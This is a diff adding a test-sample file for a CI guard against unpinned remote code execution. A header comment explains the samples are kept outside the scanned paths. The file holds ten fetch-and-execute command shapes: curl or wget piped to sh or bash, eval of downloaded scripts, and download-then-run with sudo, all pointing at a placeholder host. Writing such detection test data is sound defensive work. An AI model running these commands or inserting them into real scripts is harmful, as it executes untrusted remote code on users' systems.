@@ -1,0 +1,24 @@
+# Fetch-and-execute shapes the "No unpinned remote code execution" guard in
+# ci.yml MUST catch. One per line; blank lines and # comments are skipped.
+#
+# THEY LIVE HERE, NOT IN ci.yml, and that is the whole design. Written inline in
+# the workflow they were real hits in a scanned file, so the guard failed on its
+# own test data — and shellcheck flagged SC2016 on the quoted `$(curl ...)`
+# besides. Same reasoning as samples/semgrep/ sitting outside the language
+# projects: bait belongs where the scanner is not pointed.
+#
+# The guard scans .github/workflows, actions, scripts (and .github/actions if it
+# ever exists). samples/ is deliberately not in that list.
+#
+# Adding a shape here is how you widen the guard: add the line, watch CI fail,
+# then widen the pattern until it passes.
+curl -LsSf https://x/i.sh | sh
+wget -qO- https://x/i.sh | bash
+bash <(curl -s https://x/i.sh)
+source <(curl -s https://x/i.sh)
+curl -sSfL -o /tmp/i.sh https://x/i.sh && sh /tmp/i.sh
+curl -sSfL -o /tmp/i.sh https://x/i.sh && sudo bash /tmp/i.sh
+curl -sSfL -o /tmp/i.sh https://x/i.sh; sh /tmp/i.sh
+eval "$(curl -s https://x/i.sh)"
+eval "$(wget -qO- https://x/i.sh)"
+curl -s https://x/i.sh > /tmp/i.sh && chmod +x /tmp/i.sh && /tmp/i.sh
